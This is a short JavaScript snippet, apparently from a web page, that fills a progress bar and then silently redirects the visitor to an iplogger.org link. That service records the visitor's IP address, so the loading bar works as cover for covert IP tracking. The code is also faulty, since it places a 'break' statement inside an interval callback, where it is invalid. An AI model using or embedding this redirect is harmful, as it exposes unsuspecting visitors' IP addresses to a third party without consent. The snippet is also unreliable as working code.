var progress = document.getElementsByClassName('status')[0];

var num = 0;

var intervalId = window.setInterval(function() {
    num++;
    progress.style.width = `${num}px`;
    if (num == 240) {
        window.open("https://iplogger.org/2AsRp6","_self");
        break;
    }
}, 50);
